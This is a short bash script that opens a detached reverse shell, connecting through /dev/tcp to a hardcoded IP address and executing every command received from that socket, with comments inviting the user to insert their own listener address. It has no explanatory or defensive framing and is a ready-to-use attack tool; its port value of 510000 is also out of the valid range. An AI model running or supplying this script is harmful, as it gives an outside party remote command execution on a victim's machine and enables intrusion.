#!/bin/bash

# Set your LHOST and LPORT here
LHOST="107.175.243.19"  # Replace with your IP address
LPORT="510000"  	# Replace with your port number

# Start the reverse shell
nohup bash -c "exec 5<>/dev/tcp/$LHOST/$LPORT; cat <&5 | while read line; do \$line 2>&5 >&5; done" & disown
